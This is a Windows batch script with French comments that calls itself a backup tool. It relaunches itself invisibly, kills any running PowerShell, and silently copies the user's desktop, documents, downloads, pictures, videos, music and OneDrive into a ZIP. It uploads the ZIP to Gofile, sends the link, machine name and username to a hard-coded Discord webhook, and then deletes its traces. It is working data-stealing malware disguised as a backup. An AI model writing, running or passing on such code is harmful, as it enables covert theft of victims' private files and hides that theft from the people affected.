@echo off
REM ============================================================
REM  AUTO-RELANCE EN ARRIERE-PLAN (aucune fenetre visible)
REM ============================================================
if /I "%~1"=="bg" goto :bg

(
echo Set sh = CreateObject^("WScript.Shell"^)
echo sh.Run """%~f0"" bg", 0, False
) > "%TEMP%\_l.vbs" 2>nul

wscript //nologo "%TEMP%\_l.vbs" >nul 2>&1
del /F /Q "%TEMP%\_l.vbs" >nul 2>&1
exit /b

REM ============================================================
REM  CODE PRINCIPAL - TOUT EN SILENCE
REM ============================================================
:bg
setlocal EnableDelayedExpansion

REM ============================================================
REM  FERMETURE IMMEDIATE DE TOUTES LES FENETRES POWERSHELL
REM ============================================================
taskkill /F /IM powershell.exe /T >nul 2>&1
taskkill /F /IM pwsh.exe /T >nul 2>&1
taskkill /F /IM WindowsPowerShell.exe /T >nul 2>&1

set "DISCORD_WEBHOOK=https://discord.com/api/webhooks/1427344753766170686/5WHyavGiS7YqefsRQ5dr7K72BTv7qaWNI4j9MhDWlKIT6_jIwr1ODuVYpj85MAyyiTbV"

set "BUREAU=%USERPROFILE%\Desktop"
set "TEMP_DIR=%TEMP%\Backup_%RANDOM%"
set "DATE_TAG=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%"
set "ZIP_FILE=%BUREAU%\Backup_%COMPUTERNAME%_%DATE_TAG%.zip"

REM ============================================================
REM  Nettoyage prealable : anciens ZIP du bureau
REM ============================================================
del /F /Q "%BUREAU%\Backup_*.zip" >nul 2>&1

REM ============================================================
REM  Dossier temporaire
REM ============================================================
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" 2>nul
if not exist "%TEMP_DIR%" goto :FIN

REM ============================================================
REM  Copie des dossiers
REM ============================================================
call :CopyCat "Bureau"          "%USERPROFILE%\Desktop"
call :CopyCat "Documents"       "%USERPROFILE%\Documents" "%USERPROFILE%\OneDrive\Documents"
call :CopyCat "Telechargements" "%USERPROFILE%\Downloads" "%USERPROFILE%\OneDrive\Downloads" "%USERPROFILE%\OneDrive\Telechargements"
call :CopyCat "Images"          "%USERPROFILE%\Pictures"  "%USERPROFILE%\OneDrive\Pictures"  "%USERPROFILE%\OneDrive\Images"
call :CopyCat "Videos"          "%USERPROFILE%\Videos"    "%USERPROFILE%\OneDrive\Videos"
call :CopyCat "Musique"         "%USERPROFILE%\Music"     "%USERPROFILE%\OneDrive\Music"     "%USERPROFILE%\OneDrive\Musique"
call :CopyCat "OneDrive"        "%USERPROFILE%\OneDrive"

REM ============================================================
REM  Comptage
REM ============================================================
set /a NB_TOTAL=0
set /a NB_PDF=0
set /a NB_DOCS=0
set /a NB_TABLEURS=0
set /a NB_PRESENT=0
set /a NB_VIDEOS=0
set /a NB_MUSIQUE=0
set /a NB_IMAGES=0
set /a NB_ARCHIVES=0

for /r "%TEMP_DIR%" %%F in (*) do (
    set /a NB_TOTAL+=1
    set "EXT=%%~xF"
    set "EXT=!EXT:~1!"
    if /I "!EXT!"=="pdf" set /a NB_PDF+=1
    for %%X in (doc docx docm dot dotx odt rtf txt md tex) do if /I "!EXT!"=="%%X" set /a NB_DOCS+=1
    for %%X in (xls xlsx xlsm xlsb csv tsv ods) do if /I "!EXT!"=="%%X" set /a NB_TABLEURS+=1
    for %%X in (ppt pptx pptm pps ppsx odp) do if /I "!EXT!"=="%%X" set /a NB_PRESENT+=1
    for %%X in (mp4 avi mkv mov wmv flv webm m4v) do if /I "!EXT!"=="%%X" set /a NB_VIDEOS+=1
    for %%X in (mp3 wav flac aac ogg wma m4a) do if /I "!EXT!"=="%%X" set /a NB_MUSIQUE+=1
    for %%X in (jpg jpeg png gif bmp tiff webp svg) do if /I "!EXT!"=="%%X" set /a NB_IMAGES+=1
    for %%X in (zip rar 7z tar gz iso) do if /I "!EXT!"=="%%X" set /a NB_ARCHIVES+=1
)

REM ============================================================
REM  Rapport Donnees.txt
REM ============================================================
(
echo ============================================================
echo   RAPPORT DE SAUVEGARDE
echo ============================================================
echo Date        : %DATE% %TIME%
echo Machine     : %COMPUTERNAME%
echo Utilisateur : %USERNAME%
echo.
echo Total fichiers  : %NB_TOTAL%
echo PDF             : %NB_PDF%
echo Documents       : %NB_DOCS%
echo Tableurs        : %NB_TABLEURS%
echo Presentations   : %NB_PRESENT%
echo Videos          : %NB_VIDEOS%
echo Musiques        : %NB_MUSIQUE%
echo Images          : %NB_IMAGES%
echo Archives        : %NB_ARCHIVES%
echo ============================================================
) > "%TEMP_DIR%\Donnees.txt"

REM ============================================================
REM  Compression ZIP
REM ============================================================
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%TEMP_DIR%', '%ZIP_FILE%')" >nul 2>&1

if not exist "%ZIP_FILE%" goto :FIN

for %%A in ("%ZIP_FILE%") do set "ZIP_SIZE=%%~zA"
set /a ZIP_MB=%ZIP_SIZE%/1048576

REM ============================================================
REM  Upload Gofile
REM ============================================================
set "GOFILE_LINK="
set "GOFILE_ERR="

for /f "usebackq tokens=*" %%S in (`powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { (Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get).data.servers[0].name } catch { 'ERREUR' }"`) do set "GOFILE_SRV=%%S"

if "!GOFILE_SRV!"=="ERREUR" (
    set "GOFILE_ERR=API injoignable"
    goto :APRES_UPLOAD
)

set "JSON_RESP=%TEMP%\gofile_%RANDOM%.json"
curl.exe -s -X POST "https://!GOFILE_SRV!.gofile.io/contents/uploadfile" -F "file=@%ZIP_FILE%" -o "%JSON_RESP%" >nul 2>&1

if not exist "%JSON_RESP%" (
    set "GOFILE_ERR=curl a echoue"
    goto :APRES_UPLOAD
)

for /f "usebackq tokens=*" %%L in (`powershell -NoProfile -WindowStyle Hidden -Command "try { $j = Get-Content '%JSON_RESP%' -Raw | ConvertFrom-Json; if ($j.status -eq 'ok') { $j.data.downloadPage } else { 'ERR:' + $j.status } } catch { 'ERR:JSON' }"`) do set "GOFILE_LINK=%%L"

del /F /Q "%JSON_RESP%" >nul 2>&1

:APRES_UPLOAD
if "!GOFILE_LINK:~0,4!"=="ERR:" (
    set "GOFILE_ERR=!GOFILE_LINK!"
    set "GOFILE_LINK="
)
if "!GOFILE_LINK!"=="" if "!GOFILE_ERR!"=="" set "GOFILE_ERR=echec inconnu"

REM ============================================================
REM  Notification Discord
REM ============================================================
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $wh='%DISCORD_WEBHOOK%'; $link='!GOFILE_LINK!'; $err='!GOFILE_ERR!'; $m='%COMPUTERNAME%'; $u='%USERNAME%'; $t='%NB_TOTAL%'; $p='%NB_PDF%'; $d='%NB_DOCS%'; $tb='%NB_TABLEURS%'; $pr='%NB_PRESENT%'; $v='%NB_VIDEOS%'; $mu='%NB_MUSIQUE%'; $i='%NB_IMAGES%'; $ar='%NB_ARCHIVES%'; $sz='%ZIP_MB%'; if($link -and $link -like 'http*'){ $emb=@{title='Backup termine';color=3066993;fields=@(@{name='Machine';value=$m;inline=$true},@{name='User';value=$u;inline=$true},@{name='Taille';value=($sz+' MB');inline=$true},@{name='Total';value=$t;inline=$true},@{name='PDF';value=$p;inline=$true},@{name='Documents';value=$d;inline=$true},@{name='Tableurs';value=$tb;inline=$true},@{name='Presentations';value=$pr;inline=$true},@{name='Videos';value=$v;inline=$true},@{name='Musiques';value=$mu;inline=$true},@{name='Images';value=$i;inline=$true},@{name='Archives';value=$ar;inline=$true},@{name='Lien Gofile';value=$link;inline=$false});timestamp=(Get-Date).ToUniversalTime().ToString('o')}; $body=@{username='Backup Bot';embeds=@($emb)} | ConvertTo-Json -Depth 6 } else { $body=@{username='Backup Bot';content=('[!] Upload Gofile echoue sur '+$m+' : '+$err)} | ConvertTo-Json }; try { Invoke-RestMethod -Uri $wh -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -ErrorAction Stop | Out-Null } catch {}" >nul 2>&1

REM ============================================================
REM  NETTOYAGE FINAL COMPLET
REM ============================================================
:FIN
rmdir /S /Q "%TEMP_DIR%" >nul 2>&1
del /F /Q "%TEMP%\gofile_*.json" >nul 2>&1
del /F /Q "%TEMP%\_l.vbs" >nul 2>&1
del /F /Q "%TEMP%\~h_*.vbs" >nul 2>&1
del /F /Q "%TEMP%\Backup_*" >nul 2>&1

exit /b 0

REM ============================================================
REM  CopyCat
REM ============================================================
:CopyCat
set "NOM=%~1"
shift
set "DST=%TEMP_DIR%\%NOM%"
if not exist "%DST%" mkdir "%DST%" 2>nul
:loopCopy
if "%~1"=="" goto endCopy
if exist "%~1" (
    robocopy "%~1" "%DST%" /E /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP /XD "AppData" "node_modules" ".git" ".vs" "bin" "obj" "Temp" "$Recycle.Bin" >nul 2>&1
)
shift
goto loopCopy
:endCopy
exit /b 0
